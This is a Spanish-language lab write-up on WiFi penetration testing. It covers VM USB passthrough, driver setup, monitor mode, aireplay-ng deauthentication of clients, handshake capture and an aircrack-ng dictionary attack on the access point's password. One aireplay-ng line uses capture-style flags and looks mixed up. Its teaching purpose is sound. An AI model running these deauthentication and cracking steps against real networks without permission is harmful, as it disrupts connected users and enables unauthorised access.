# Pentesting Wifi

En esta practica demostraremos lo "sencillo" que puede resultar sacar con fuerza bruta una contraseña WiFi si esta no es segura.

## Configuración MV

El primero de los pasos sería configurar el entorno virtual de forma que podamos utilizar el adaptador de red USB para posteriormente ponerlo en modo monitor.

En esta ocasión hemos utilizado QEMU/KVM y la configuración de este apartado es tan fácil como agregar el XML con el puntero de que dispositivo USB es el que queremos conectar:

```xml
<hostdev mode="subsystem" type="usb" managed="yes">
  <source>
    <vendor id="0x2357"/>
    <product id="0x010c"/>
    <address bus="3" device="6"/>
  </source>
  <alias name="hostdev0"/>
  <address type="usb" bus="0" port="4"/>
</hostdev>
```

De esta forma la máquina ya será capaz de detectar el nuevo adaptador inalámbrico.

![usb](img/0%20usb.png)

## Drivers

La instalación de los drivers es un paso un poco tricky ya que debemos buscar los drivers del chip de nuestro adaptador en este caso un [rtl8188eus](https://github.com/drygdryg/rtl8188eus) agregar la excepción a la lista negra y compilarlos, tras reiniciar la máquina podremos poner el adaptador en modo monitor.

**Ejemplo de script de instalación**
![drivers](img/2%20drivers.png)

**Adaptador configurado**
![adapter](img/1%20adaptador.png)

## Preparación

Una vez tengamos nuestro super adaptador debemos ponerlo en modo monitor, de esta forma el chip no trabajará como un adaptador de red normal sino que será capaz de sacar mucha mas información de la que de normal puede extraer. En mi caso el adaptador tiene un nombre muy largo así que a lo largo me referire al adaptador inalambrico por el nombre generico wlan0, es posible que en tu caso no se llame exactamente igual.

```bash
$sudo ifconfig wlan0 down
$sudo airmon-ng check kill
$sudo iwconfig wlan0 mode monitor
$sudo ifconfig wlan0 up
$iwconfig

#Vemos en mode:monitor
```

![monitor](img/3%20mode%20monitor.png)

**Test modo monitor**

```bash
$sudo aireplay-ng --test wlan0
```

![aireplay](img/4%20test%20airreplay.png)

## Ataque

El ataque consiste en sacar la contraseña del punto de acceso mediante un ataque de diccionario gracias a haber deautenticado a un cliente conectado y haber capturado el handshake.

Lo primero que debemos hacer es conocer las redes que nos rodean con airodump:

```bash
$ airodump-ng <Interfaz ej:wlan0>
```

Luego deautenticar a sus clientes:

![handshake](img/5%20hanshake.png)

```bash
$ aireplay-ng -c <CHANNEL> -a <MACSSID> -w <nombreFichero> <Interfaz ej:wlan0>
or
$ aireplay-ng -0 1 -a <MACSSID> -c <MACCliente> <Interfaz ej:wlan0>
```

![air](img/6%20airdum.png)


Finalmente con el handshake interceptado, crackearlo:

```bash
aircrack-ng -w <DICCIONARIO> -b <MACSSID> <nombreFichero>*.cap
```

![final](img/7%20key found.png)